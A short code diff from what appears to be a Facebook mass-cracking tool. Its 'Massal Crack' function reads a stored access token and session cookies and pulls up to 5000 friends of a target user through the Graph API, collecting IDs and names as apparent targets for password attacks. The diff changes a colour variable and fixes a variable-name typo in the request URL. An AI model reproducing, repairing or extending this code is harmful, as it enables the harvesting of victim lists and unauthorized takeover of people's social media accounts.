@@ -632,7 +632,7 @@ def result():
 		back()
 ###----------[ CRACK MASSAL ]----------###
 def massal():
-	prints(nel(f'               {P2}{H}Massal Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'               {P2}{B}Massal Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
@@ -669,7 +669,7 @@ def massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+	       url = requests.get('https://graph.facebook.com/v2.0/'+user+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
